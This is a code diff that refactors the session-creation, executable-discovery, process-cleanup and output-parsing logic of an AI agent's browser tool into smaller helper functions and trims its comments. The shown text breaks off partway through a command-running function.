     reap_every_cycles = max(1, round(BROWSER_ORPHAN_REAP_INTERVAL / 30))
     cycle = 0
@@ -2854,7 +1929,7 @@ def _update_session_activity(task_id: str):
     """Update the last activity timestamp for a session.
 
     Also records the owning Hermes home on first sight so the process-global
-    janitor can tear the session down under its owner's scope (#86402).  An
+    janitor can tear the session down under its owner's scope.  An
     activity touch deliberately does NOT reset ``_cleanup_failures`` — only a
     successful cleanup does.
     """
@@ -3028,20 +2103,14 @@ BROWSER_TOOL_SCHEMAS = [
 def _create_local_session(task_id: str, allow_real_profile: bool = True) -> Dict[str, str]:
     import uuid
 
-    # Real-profile consent: instead of an agent-browser-managed throwaway
-    # Chromium, attach this local session (via CDP) to the user's default
-    # browser running on a hermes-owned SNAPSHOT of their real profile —
-    # live logins/cookies included. Fail closed on resolver/launch errors:
-    # a consented user must never be silently downgraded to a throwaway.
-    #
-    # ``allow_real_profile=False`` is passed by the hybrid private-URL sidecar
-    # (``::local`` key): that path exists to keep a LAN/loopback host OFF the
-    # cloud backend, and routing the user's full authenticated cookie jar to an
-    # arbitrary internal host the model chose to visit is a strictly larger
-    # exposure than the routing rule was protecting against — and one the user
-    # never consented to for that URL. The sidecar always gets a throwaway
-    # profile. (Also keeps a real-profile resolve failure from breaking
-    # private-URL routing, which has nothing to do with the real profile.)
+    # Real-profile consent: attach this local session (via CDP) to the user's
+    # browser running on a hermes-owned SNAPSHOT of their real profile, logins
+    # included. Fail closed on resolver/launch errors — a consented user must
+    # never be silently downgraded to a throwaway. The hybrid private-URL
+    # sidecar passes allow_real_profile=False: handing the user's cookie jar to
+    # an arbitrary internal host the model chose is a larger, unconsented
+    # exposure than the routing rule protects against (and a real-profile
+    # failure must not break private-URL routing).
     if allow_real_profile:
         cdp_url, err = _real_profile_cdp()
         if err:
@@ -3124,23 +2193,69 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
     }
 
 
-def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
+def _create_cloud_session_or_fallback(task_id: str, provider) -> Dict[str, Any]:
+    """Create a cloud session; fall back to local Chromium (marked degraded) on failure.
+
+    Some cloud providers (Browser-Use v3) return an HTTP CDP discovery URL
+    instead of a raw websocket endpoint, so ``cdp_url`` is resolved here.
     """
-    Get or create session info for the given session key.
+    try:
+        session_info = provider.create_session(task_id)
+        if not session_info or not isinstance(session_info, dict):
+            raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
+        if session_info.get("cdp_url"):
+            session_info = dict(session_info)
+            session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
+        return session_info
+    except Exception as e:
+        provider_name = type(provider).__name__
+        logger.warning(
+            "Cloud provider %s failed (%s); attempting fallback to local "
+            "Chromium for task %s",
+            provider_name, e, task_id,
+            exc_info=True,
+        )
+        try:
+            session_info = _create_local_session(task_id)
+        except Exception as local_error:
+            raise RuntimeError(
+                f"Cloud provider {provider_name} failed ({e}) and local "
+                f"fallback also failed ({local_error})"
+            ) from e
+        # Mark session as degraded for observability
+        if isinstance(session_info, dict):
+            session_info = dict(session_info)
+            session_info["fallback_from_cloud"] = True
+            session_info["fallback_reason"] = str(e)
+            session_info["fallback_provider"] = provider_name
+        return session_info
 
-    In cloud mode, creates a Browserbase session with proxies enabled.
-    In local mode, generates a session name for agent-browser --session.
-    Also starts the inactivity cleanup thread and updates activity tracking.
-    Thread-safe: multiple subagents can call this concurrently.
 
-    Args:
-        task_id: Session key.  Normally the task_id as-is, but may carry the
-            ``::local`` suffix for the hybrid-routing local sidecar — in that
-            case the cloud provider is skipped even when one is configured,
-            and a local Chromium session is created instead.
+def _create_session_for_key(task_id: str, force_local: bool) -> Dict[str, Any]:
+    """Create a fresh session for ``task_id`` (runs OUTSIDE the lock: cloud mode makes a network call).
 
-    Returns:
-        Dict with session_name (always), bb_session_id + cdp_url (cloud only)
+    Precedence: CDP override > hybrid local sidecar > cloud provider > local.
+    The hybrid private-URL sidecar NEVER gets the real profile — presenting real
+    cookies to an arbitrary LAN host the model routed there is unconsented
+    exposure (see ``_create_local_session``).
+    """
+    cdp_override = _get_cdp_override()
+    if cdp_override and not force_local:
+        return _create_cdp_session(task_id, cdp_override)
+    if force_local:
+        return _create_local_session(task_id, allow_real_profile=False)
+    provider = _get_cloud_provider()
+    if provider is None:
+        return _create_local_session(task_id)
+    return _create_cloud_session_or_fallback(task_id, provider)
+def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
+    """Get or create session info for a session key (thread-safe).
+
+    ``task_id`` may carry the ``::local`` suffix (hybrid local sidecar), which
+    forces a local Chromium even when a cloud provider is configured. Also
+    starts the inactivity cleanup thread and touches activity tracking.
+    Returns a dict with ``session_name`` (always) plus ``bb_session_id`` /
+    ``cdp_url`` for cloud sessions.
     """
     if task_id is None:
         task_id = "default"
@@ -3155,7 +2270,7 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
         # Check if we already have a session for this task
         existing_session = _active_sessions.get(task_id)
 
-    # Suspect-session recycle (#72205 / #85125 3b): a previous command
+    # Suspect-session recycle: a previous command
     # timeout marked this cached session suspect via the SuspectableBackend
     # adapter.  ensure_healthy() tears it down here, at next use, and we fall
     # through to create a fresh session — the expensive recycle lives on this
@@ -3201,52 +2316,7 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
     # URLs in the same conversation continue to use the cloud session under
     # the bare task_id key.
     force_local = _is_local_sidecar_key(task_id)
-
-    # Create session outside the lock (network call in cloud mode)
-    cdp_override = _get_cdp_override()
-    if cdp_override and not force_local:
-        session_info = _create_cdp_session(task_id, cdp_override)
-    elif force_local:
-        # Hybrid private-URL sidecar: NEVER the real profile (see
-        # _create_local_session — presenting real cookies to an arbitrary LAN
-        # host the model routed here is unconsented exposure).
-        session_info = _create_local_session(task_id, allow_real_profile=False)
-    else:
-        provider = _get_cloud_provider()
-        if provider is None:
-            session_info = _create_local_session(task_id)
-        else:
-            try:
-                session_info = provider.create_session(task_id)
-                # Validate cloud provider returned a usable session
-                if not session_info or not isinstance(session_info, dict):
-                    raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
-                if session_info.get("cdp_url"):
-                    # Some cloud providers (including Browser-Use v3) return an HTTP
-                    # CDP discovery URL instead of a raw websocket endpoint.
-                    session_info = dict(session_info)
-                    session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
-            except Exception as e:
-                provider_name = type(provider).__name__
-                logger.warning(
-                    "Cloud provider %s failed (%s); attempting fallback to local "
-                    "Chromium for task %s",
-                    provider_name, e, task_id,
-                    exc_info=True,
-                )
-                try:
-                    session_info = _create_local_session(task_id)
-                except Exception as local_error:
-                    raise RuntimeError(
-                        f"Cloud provider {provider_name} failed ({e}) and local "
-                        f"fallback also failed ({local_error})"
-                    ) from e
-                # Mark session as degraded for observability
-                if isinstance(session_info, dict):
-                    session_info = dict(session_info)
-                    session_info["fallback_from_cloud"] = True
-                    session_info["fallback_reason"] = str(e)
-                    session_info["fallback_provider"] = provider_name
+    session_info = _create_session_for_key(task_id, force_local)
 
     with _cleanup_lock:
         # Double-check: another thread may have created a session while we
@@ -3275,7 +2345,6 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
     return session_info
 
 
-
 def _agent_browser_candidate_present(path: str | None) -> bool:
     if not path:
         return False
@@ -3285,14 +2354,11 @@ def _agent_browser_candidate_present(path: str | None) -> bool:
 
 
 def _resolve_npx_bin() -> Optional[str]:
-    """Resolve a runnable npx binary, preferring the Hermes-managed/Homebrew
-    extended search over a bare ambient PATH lookup.
+    """Resolve a runnable npx, preferring the Hermes-managed/Homebrew extended PATH.
 
-    Checking bare PATH first would let a broken or unrelated system npx
-    shadow a healthy Hermes-managed one with no recovery — every candidate
-    is therefore validated with ``node_tool_runnable`` (the same check
-    ``find_hermes_node_executable`` uses to self-heal a managed Node tree)
-    before being trusted, falling through to the next candidate otherwise.
+    Bare PATH first would let a broken system npx shadow a healthy managed one
+    with no recovery, so every candidate is validated with ``node_tool_runnable``
+    before being trusted.
     """
     extended_path = _merge_browser_path("")
     if extended_path:
@@ -3305,15 +2371,38 @@ def _resolve_npx_bin() -> Optional[str]:
     return None
 
 
+def _agent_browser_candidates(extended_path: str):
+    """Yield agent-browser lookup candidates in resolution order (lazily — each is a filesystem probe).
+
+    Order: ambient PATH (global install) → extended PATH (Hermes-managed Node,
+    macOS versioned Homebrew, Termux/system dirs) → repo-local node_modules/.bin.
+    The local lookup goes through ``shutil.which`` with an explicit path so
+    Windows resolves the ``.cmd`` shim (CreateProcess cannot run npm's
+    extensionless POSIX shim — WinError 193) while POSIX keeps the plain one.
+    """
+    yield shutil.which("agent-browser")
+    if extended_path:
+        yield shutil.which("agent-browser", path=extended_path)
+    local_bin_dir = Path(__file__).parent.parent / "node_modules" / ".bin"
+    if local_bin_dir.is_dir():
+        yield shutil.which("agent-browser", path=str(local_bin_dir))
+
+
 def _find_agent_browser(*, validate: bool = True) -> str:
     """
     Find the agent-browser CLI executable.
 
     Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
-    node, local node_modules/.bin/, npx fallback.
+    node, local node_modules/.bin/, npx fallback, then a lazy install.
 
-    Returns:
-        Path to agent-browser executable
+    Every candidate is validated with ``agent_browser_runnable`` before it is
+    cached. A bare ``shutil.which`` hit is NOT trusted: agent-browser's npm
+    postinstall re-points a global symlink at our local node_modules binary,
+    which disappears on the next ``hermes update`` and leaves a dangling link
+    that ``which`` still reports but exec fails on (exit 127). Validating lets a
+    dead candidate fall through instead of being cached and killing every
+    browser tool. ``validate=False`` (schema-time check_fn) only tests presence
+    and never caches.
 
     Raises:
         FileNotFoundError: If agent-browser is not installed
@@ -3328,73 +2417,24 @@ def _find_agent_browser(*, validate: bool = True) -> str:
             )
         return _cached_agent_browser
 
-    # Note: _agent_browser_resolved is set at each return site below
-    # (not before the search) to prevent a race where a concurrent thread
-    # sees resolved=True but _cached_agent_browser is still None.
-    #
-    # Every candidate below is validated with ``agent_browser_runnable`` before
-    # it is cached. A bare ``shutil.which`` hit is NOT trusted: agent-browser's
-    # npm postinstall re-points a global install symlink at our local
-    # node_modules binary, which disappears on the next ``hermes update`` and
-    # leaves a dangling link that ``which`` still reports but exec fails on with
-    # exit 127 (issue #48521). Validating lets a dead candidate fall through to
-    # the next working resolution (extended PATH → local .bin → npx) instead of
-    # caching the broken one and silently killing every browser tool.
+    def _accept(candidate: str) -> str:
+        # _agent_browser_resolved is set at each accept site (not before the
+        # search) so a concurrent reader never sees resolved=True with a None cache.
+        global _cached_agent_browser, _agent_browser_resolved
+        if validate:
+            _cached_agent_browser = candidate
+            _agent_browser_resolved = True
+        return candidate
 
-    # Check if it's in PATH (global install)
-    which_result = shutil.which("agent-browser")
-    if which_result and (
-        agent_browser_runnable(which_result) if validate else _agent_browser_candidate_present(which_result)
-    ):
-        if not validate:
-            return which_result
-        _cached_agent_browser = which_result
-        _agent_browser_resolved = True
-        return which_result
-
-    # Build an extended search PATH including Hermes-managed Node, macOS
-    # versioned Homebrew installs, and fallback system dirs like Termux.
+    ok = agent_browser_runnable if validate else _agent_browser_candidate_present
     extended_path = _merge_browser_path("")
-    if extended_path:
-        which_result = shutil.which("agent-browser", path=extended_path)
-        if which_result and (
-            agent_browser_runnable(which_result) if validate else _agent_browser_candidate_present(which_result)
-        ):
-            if not validate:
-                return which_result
-            _cached_agent_browser = which_result
-            _agent_browser_resolved = True
-            return which_result
+    for candidate in _agent_browser_candidates(extended_path):
+        if candidate and ok(candidate):
+            return _accept(candidate)
 
-    # Check local node_modules/.bin/ (npm install in repo root).
-    # On Windows, npm drops three shims in .bin: an extensionless POSIX shell
-    # script (for Git Bash / WSL), `agent-browser.cmd` (for cmd/PowerShell),
-    # and `agent-browser.ps1` (for PowerShell). CreateProcess (used by Python's
-    # subprocess on Windows) cannot execute the extensionless shim — it raises
-    # WinError 193 "%1 is not a valid Win32 application". We must resolve to the
-    # `.cmd` shim instead. `shutil.which` consults PATHEXT, so we delegate to it
-    # with an explicit path so POSIX hosts still pick the extensionless shim.
-    repo_root = Path(__file__).parent.parent
-    local_bin_dir = repo_root / "node_modules" / ".bin"
-    if local_bin_dir.is_dir():
-        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
-        if local_which and (
-            agent_browser_runnable(local_which) if validate else _agent_browser_candidate_present(local_which)
-        ):
-            if not validate:
-                return local_which
-            _cached_agent_browser = local_which
-            _agent_browser_resolved = True
-            return _cached_agent_browser
-
-    # Check common npx locations (also search the extended fallback PATH)
-    npx_path = _resolve_npx_bin()
-    if npx_path:
-        if not validate:
-            return NPX_AGENT_BROWSER_SENTINEL
-        _cached_agent_browser = NPX_AGENT_BROWSER_SENTINEL
-        _agent_browser_resolved = True
-        return _cached_agent_browser
+    # npx fallback (also searches the extended PATH)
+    if _resolve_npx_bin():
+        return _accept(NPX_AGENT_BROWSER_SENTINEL)
 
     if not validate:
         raise FileNotFoundError("agent-browser CLI not found")
@@ -3412,9 +2452,7 @@ def _find_agent_browser(*, validate: bool = True) -> str:
             ]
             for recheck in candidates:
                 if recheck and agent_browser_runnable(recheck):
-                    _cached_agent_browser = recheck
-                    _agent_browser_resolved = True
-                    return recheck
+                    return _accept(recheck)
     except Exception:
         pass
 
@@ -3427,39 +2465,16 @@ def _find_agent_browser(*, validate: bool = True) -> str:
 
 
 def _kill_process_tree(proc: "subprocess.Popen") -> None:
-    """Best-effort kill of *proc* and any descendants it spawned.
+    """Best-effort kill of *proc* and every descendant it spawned; never raises.
 
-    ``Popen.kill()`` only signals the direct child PID. npm/npx routinely
-    fork further processes (registry-fetch helpers, npm's own lifecycle
-    runner, agent-browser's own detached daemon grandchild) that can survive
-    a plain ``kill()`` of the top-level PID and keep a ``capture_output``-style
-    pipe open, hanging the caller's ``communicate()`` past the nominal
-    timeout — the same orphaned-pipe hazard already hit in production on
-    POSIX (see ``tools/process_registry.py``'s ``_reader_loop``, issue
-    #68915: a backgrounded grandchild inheriting a pipe's write end kept it
-    from ever reaching EOF). That hazard is cross-platform, not
-    Windows-specific; what *is* Windows-specific is the lack of a remedy
-    other than killing the tree — anonymous pipes there don't support
-    overlapped I/O, so there's no ``select()``-style non-blocking read to
-    poll around a stuck grandchild the way POSIX can. Killing the whole
-    process group/tree the child was launched into reaches those
-    descendants on both platforms.
-
-    Fires SIGTERM then SIGKILL back-to-back with no grace period between
-    them (unlike ``tools/mcp_stdio_watchdog.py``'s ``_terminate_process_group``,
-    which waits between signals because it's reacting to a live daemon being
-    orphaned). By the time this is called, the caller has already burned its
-    full timeout budget waiting for a graceful exit — there's nothing to gain
-    from waiting again here, only more delay on an already-timed-out call.
-
-    Delegates to :func:`agent.deadline.kill_process_tree` (#85125 4d): same
-    ``taskkill /T /F`` on Windows and killpg-when-group-leader on POSIX, plus
-    a psutil descendant sweep that also reaches descendants that ``setsid``'d
-    into their own session (agent-browser's detached daemon grandchild).
-    SIGKILL-only instead of the old zero-grace SIGTERM→SIGKILL pair — the
-    grace period was already zero, so the observable effect is identical.
-    Any delegation failure falls back to the original local implementation
-    (:func:`_legacy_kill_process_tree`); never raises either way.
+    ``Popen.kill()`` only signals the direct child. npm/npx fork helpers and
+    agent-browser's detached daemon grandchild, which survive a plain kill and
+    keep a capture pipe open so ``communicate()`` never sees EOF — on Windows
+    there is no non-blocking read to poll around that, so the whole tree must
+    go. No grace period: the caller already burned its full timeout waiting.
+    Delegates to :func:`agent.deadline.kill_process_tree` (taskkill /T /F,
+    killpg, plus a psutil sweep that reaches ``setsid``'d descendants) and
+    falls back to :func:`_legacy_kill_process_tree` on any failure.
     """
     try:
         from agent.deadline import kill_process_tree as _deadline_kill_tree
@@ -3470,7 +2485,7 @@ def _kill_process_tree(proc: "subprocess.Popen") -> None:
 
 
 def _legacy_kill_process_tree(proc: "subprocess.Popen") -> None:
-    """Pre-#85125 local tree-kill — fallback when agent.deadline is unavailable."""
+    """Local tree-kill — fallback when agent.deadline is unavailable."""
     if os.name == "nt":
         try:
             subprocess.run(
@@ -3510,29 +2525,14 @@ def _legacy_kill_process_tree(proc: "subprocess.Popen") -> None:
 def warm_agent_browser_npx_cache(timeout: float = 60.0) -> bool:
     """Best-effort pre-fetch of the agent-browser npm package via npx.
 
-    agent-browser is no longer a root package.json dependency (#43564) —
-    it resolves lazily via ``npx agent-browser`` instead, which keeps it
-    out of the npm workspace install graph entirely (nothing to prune it
-    anymore) but means the first real invocation in a session would
-    otherwise pay npx's registry-lookup/fetch cost. Calling this during
-    ``hermes update`` (or ``hermes doctor --fix``) warms npx's own cache
-    ahead of time, restoring the "available before any session starts"
-    property agent-browser had while it was an eager root dependency —
-    without re-entangling it with the workspace graph.
-
-    Runs a credential-scrubbed, PATH-propagated environment matching every
-    other agent-browser subprocess spawn (see ``_build_browser_env``) —
-    this used to inherit the full parent environment, including every
-    provider/gateway credential Hermes holds, while running registry-fetched
-    npm code on every ``hermes update`` (the GHSA-m4m8-xjp4-5rmm class of
-    risk ``_build_browser_env`` exists specifically to prevent). Runs in its
-    own process group and kills the *whole* group — not just the top-level
-    npx PID — on timeout, since a surviving descendant can otherwise hold a
-    capture pipe open past the nominal deadline (see ``_kill_process_tree``).
-
-    Fire-and-forget: never raises, always safe to call opportunistically.
-    Returns True only if npx actually ran successfully (npx unavailable,
-    a timeout, or a nonzero exit all return False silently).
+    agent-browser resolves lazily via ``npx agent-browser`` (not a root
+    package.json dependency), so the first invocation in a session would pay
+    npx's registry fetch; ``hermes update`` / ``hermes doctor --fix`` call this
+    to warm the cache first. Runs with the credential-scrubbed env every other
+    agent-browser spawn uses (registry-fetched npm code must never see the
+    operator keyring), in its own process group, and tree-kills on timeout so
+    a surviving descendant cannot hold the capture pipe open.
+    Never raises; True only when npx actually exited 0.
     """
     npx_bin = _resolve_npx_bin()
     if not npx_bin:
@@ -3587,25 +2587,12 @@ def warm_agent_browser_npx_cache(timeout: float = 60.0) -> bool:
         return False
 
 
-def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
-    """Extract a screenshot file path from agent-browser human-readable output."""
-    if not text:
-        return None
-
-    patterns = [
-        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
-        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
-        r"(?P<path>/\S+?\.png)(?:\s|$)",
-    ]
-
-    for pattern in patterns:
-        match = re.search(pattern, text)
-        if match:
-            path = match.group("path").strip().strip("'\"")
-            if path:
-                return path
-
-    return None
+from tools.browser_tool_snapshot import (  # noqa: F401
+    _store_full_snapshot,
+    _truncate_snapshot,
+    _redact_browser_output,
+    _extract_screenshot_path_from_text,
+)
 
 
 def _discard_timed_out_browser_session(
@@ -3640,7 +2627,7 @@ def _discard_timed_out_browser_session(
                 daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                 if not _verify_reapable_browser_daemon(daemon_pid, task_socket_dir, session_name):
                     return
-                # Tree-kill (#68139 / #85125 4c): the daemon spawns Chromium
+                # Tree-kill: the daemon spawns Chromium
                 # children; terminating only the daemon PID leaks the whole
                 # Chromium tree.  agent.deadline.kill_process_tree escalates
                 # SIGTERM → SIGKILL across the tree.
@@ -3663,15 +2650,11 @@ def _read_browser_daemon_pid(task_socket_dir: str, session_name: str) -> Optiona
 
 
 def _browser_daemon_responsive(task_socket_dir: str, probe_timeout_s: float = 1.0) -> bool:
-    """Cheap liveness probe: can we connect to the daemon's control socket?
+    """Cheap liveness probe: connect to the daemon's unix control socket.
 
-    The agent-browser daemon listens on a unix socket inside the session's
-    socket dir.  A successful connect proves the daemon's accept loop is
-    alive (the timed-out command was wedged on the page/CDP side, not the
-    daemon).  A refused / missing / timed-out connect means the daemon is
-    wedged or dead.  Windows agent-browser uses named pipes, not unix
-    sockets — no probe is possible there, so we conservatively report
-    unresponsive (tree-kill + respawn is the safe recovery).
+    A successful connect proves the accept loop is alive (the command wedged on
+    the page/CDP side, not the daemon). Windows uses named pipes — no probe is
+    possible, so report unresponsive (tree-kill + respawn is the safe recovery).
     """
     if os.name == "nt":
         return False
@@ -3702,31 +2685,20 @@ def _handle_browser_command_timeout(
     session_info: Dict[str, Any],
     task_socket_dir: str,
 ) -> None:
-    """Recover session state after a browser command timeout (#72205, #68139).
+    """Recover session state after a browser command timeout.
 
-    The wedged-vs-alive rule:
+    * Cloud / CDP sessions: no local daemon to probe — replace the stuck client
+      generation now (fresh ``session_name``, same ``bb_session_id`` so cloud
+      cleanup still works).
+    * Local daemon alive (PID live, identity-verified, control socket accepts):
+      only the *command* wedged; mark the session suspect and let the next use
+      recycle it via ``ensure_healthy`` → clean ``close`` → fresh session.
+    * Local daemon wedged/dead: it cannot service a clean close and its Chromium
+      children would leak — tree-kill and evict now; the next call respawns.
 
-    * **Cloud / CDP sessions** — there is no local daemon to probe or kill.
-      Replace the stuck client generation immediately (fresh ``session_name``,
-      same ``bb_session_id`` so cloud cleanup still works) — #72206's
-      original behavior, preserved verbatim.
-    * **Local daemon alive** (PID readable, process alive, identity-verified
-      as ours, control socket accepts a connection): the *command* wedged —
-      page hang, stuck navigation — but the daemon itself is fine.  Killing
-      it would be overkill and slow.  Mark the session suspect only; the
-      next use recycles it through ``ensure_healthy`` → clean agent-browser
-      ``close`` → fresh session.
-    * **Local daemon wedged or dead** (no PID, dead PID, failed identity
-      check, or unresponsive socket): the daemon cannot service a clean
-      close, and its Chromium children would leak.  Tree-kill the daemon's
-      process tree via ``agent.deadline.kill_process_tree`` and evict the
-      cache entry now; the next browser call respawns from scratch.
-
-    Both local branches ``mark_suspect`` first — cheap, lock-free — so the
-    poisoned-cache invariant holds even if the eviction below races another
-    thread's replacement (``_discard_timed_out_browser_session`` no-ops on a
-    concurrent replacement; the flag then triggers one harmless no-op
-    teardown at next use).
+    Both local branches ``mark_suspect`` first (cheap, lock-free) so the
+    poisoned-cache invariant holds even if eviction races another thread's
+    replacement (the flag then costs one harmless no-op teardown).
     """
     if session_info.get("bb_session_id") or session_info.get("cdp_url"):
         _discard_timed_out_browser_session(task_id, session_info, task_socket_dir)
@@ -3785,6 +2757,57 @@ def _pid_exists(pid: int) -> bool:
     return True
 
 
+def _interpret_browser_command_output(command: str, stdout: str, stderr: str, returncode: int) -> Dict[str, Any]:
+    """Turn a finished agent-browser process's output into a result dict.
+
+    Empty stdout with rc=0 is a broken state (stale daemon) and is reported as
+    failure rather than a silent ``{"success": True, "data": {}}`` — except for
+    commands in ``_EMPTY_OK_COMMANDS``. Non-JSON output is an error, except
+    for ``screenshot`` where the saved path is recovered from the prose.
+    """
+    if stderr and stderr.strip():
+        level = logging.WARNING if returncode != 0 else logging.DEBUG
+        logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
+
+    stdout_text = stdout.strip()
+    if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
+        logger.warning("browser '%s' returned empty output (rc=0)", command)
+        return {"success": False, "error": f"Browser command '{command}' returned no output"}
+    if not stdout_text:
+        if returncode != 0:
+            error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
+            logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
+            return {"success": False, "error": error_msg}
+        return {"success": True, "data": {}}
+
+    try:
+        parsed = json.loads(stdout_text)
+    except json.JSONDecodeError:
+        raw = stdout_text[:2000]
+        logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
+                       command, returncode, raw[:500])
+        if command == "screenshot":
+            stderr_text = (stderr or "").strip()
+            combined_text = "\n".join(part for part in [stdout_text, stderr_text] if part)
+            recovered_path = _extract_screenshot_path_from_text(combined_text)
+            if recovered_path and Path(recovered_path).exists():
+                logger.info(
+                    "browser 'screenshot' recovered file from non-JSON output: %s",
+                    recovered_path,
+                )
+                return {"success": True, "data": {"path": recovered_path, "raw": raw}}
+        return {"success": False, "error": f"Non-JSON output from agent-browser for '{command}': {raw}"}
+
+    # Empty snapshot content is a common sign of daemon/CDP issues.
+    if command == "snapshot" and parsed.get("success"):
+        snap_data = parsed.get("data", {})
+        if not snap_data.get("snapshot") and not snap_data.get("refs"):
+            logger.warning("snapshot returned empty content. "
+                           "Possible stale daemon or CDP connection issue. "
+                           "returncode=%s", returncode)
+    return parsed
+
+
 def _run_browser_command(
     task_id: str,
     command: str,
@@ -3792,21 +2815,11 @@ def _run_browser_command(
     timeout: Optional[int] = None,
     _engine_override: Optional[str] = None,
 ) -> Dict[str, Any]:
-    """
-    Run an agent-browser CLI command using our pre-created Browserbase session.
+    """Run one agent-browser CLI command against the task's session; returns its parsed JSON.
 
-    Args:
-        task_id: Task identifier to get the right session
-        command: The command to run (e.g., "open", "click")
-        args: Additional arguments for the command
-        timeout: Command timeout in seconds.  ``None`` reads
-                 ``browser.command_timeout`` from config (default 30s).
-        _engine_override: Force a specific engine for this call only.  Used
-                          internally by the Lightpanda fallback to retry with
-                          Chrome without touching global state.
-
-    Returns:
-        Parsed JSON response from agent-browser
+    ``timeout=None`` reads ``browser.command_timeout`` (default 30s).
+    ``_engine_override`` forces an engine for this call only (the Lightpanda
+    fallback uses it to retry with Chrome without touching global state).
     """
     if timeout is None:
         timeout = _safe_command_timeout()
@@ -3885,53 +2898,13 @@ def _run_browser_command(
     if engine != "auto" and not _is_camofox_mode() and not session_info.get("cdp_url"):
         backend_args += ["--engine", engine]
 
-    # Keep concrete executable paths intact, even when they contain spaces.
-    # Only the synthetic npx fallback needs to expand into multiple argv items.
-    # Resolve via the same PATH + extended-PATH cascade _find_agent_browser
-    # uses (see the chrome-fallback call site above for why a bare
-    # shutil.which("npx") is wrong here).
-    if _is_npx_agent_browser_sentinel(browser_cmd):
-        _npx_bin = _resolve_npx_bin() or "npx"
-        # --ignore-scripts: see _run_chrome_fallback_command's identical comment.
-        cmd_prefix = [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
-    else:
-        cmd_prefix = [browser_cmd]
-
-    cmd_parts = cmd_prefix + backend_args + [
-        "--json",
-        command
-    ] + args
+    cmd_parts = _agent_browser_argv(browser_cmd) + backend_args + ["--json", command] + args
 
     try:
-        # Give each task its own socket directory to prevent concurrency conflicts.
-        # Without this, parallel workers fight over the same default socket path,
-        # causing "Failed to create socket directory: Permission denied" errors.
-        task_socket_dir = os.path.join(
-            _socket_safe_tmpdir(),
-            f"agent-browser-{session_info['session_name']}"
-        )
-        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
-        # Record this hermes PID as the session owner (cross-process safe
-        # orphan detection — see _write_owner_pid).
-        _write_owner_pid(task_socket_dir, session_info['session_name'])
+        task_socket_dir = _prepare_session_socket_dir(session_info["session_name"])
         logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                      command, task_id, task_socket_dir, len(task_socket_dir))
-
-        browser_env = _build_browser_env()
-
-        # Ensure subprocesses inherit the same browser-specific PATH fallbacks
-        # used during CLI discovery.
-        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
-        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
-
-        # Tell the agent-browser daemon to self-terminate after being idle
-        # for our configured inactivity timeout.  This is the daemon-side
-        # counterpart to our Python-side _cleanup_inactive_browser_sessions
-        # — the daemon kills itself and its Chrome children when no CLI
-        # commands arrive within the window.  Added in agent-browser 0.24.
-        if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
-            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
-            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms
+        browser_env = _agent_browser_command_env(task_socket_dir)
 
         # Chromium-only launch flags are rejected by Lightpanda. Strip both
         # the current and legacy variables for Lightpanda commands; explicit
@@ -3949,43 +2922,9 @@ def _run_browser_command(
         else:
             _apply_chromium_sandbox_args(browser_env)
 
-        # Use temp files for stdout/stderr instead of pipes.
-        # agent-browser starts a background daemon that inherits file
-        # descriptors.  With capture_output=True (pipes), the daemon keeps
-        # the pipe fds open after the CLI exits, so communicate() never
-        # sees EOF and blocks until the timeout fires.
         stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
         stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
-        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
-        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
-        try:
-            # See matching comment at the other Popen site above — on
-            # Windows we put agent-browser in its own process group, force
-            # STARTF_USESTDHANDLES so CreateProcess hands the child ONLY our
-            # three explicit handles (no leaked parent-console handles to
-            # confuse the Rust binary's daemon-spawn), and close_fds=True to
-            # block inheritance of everything else.
-            _popen_extra: dict = {}
-            if os.name == "nt":
-                # See matching block at the other Popen site — CREATE_NO_WINDOW
-                # only, NO CREATE_NEW_PROCESS_GROUP (cancels asyncio loop task
-                # on Python 3.11 Windows → KeyboardInterrupt in CLI MainThread).
-                _popen_extra["creationflags"] = windows_hide_flags()
-                _popen_extra["close_fds"] = True
-                _si = subprocess.STARTUPINFO()
-                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
-                _popen_extra["startupinfo"] = _si
-            proc = subprocess.Popen(
-                cmd_parts,
-                stdout=stdout_fd,
-                stderr=stderr_fd,
-                stdin=subprocess.DEVNULL,
-                env=browser_env,
-                **_popen_extra,
-            )
-        finally:
-            os.close(stdout_fd)
-            os.close(stderr_fd)
+        proc = _popen_agent_browser(cmd_parts, browser_env, task_socket_dir, command)
 
         try:
             proc.wait(timeout=timeout)
@@ -4013,80 +2952,8 @@ def _run_browser_command(
                 stdout = f.read()
             with open(stderr_path, "r", encoding="utf-8") as f:
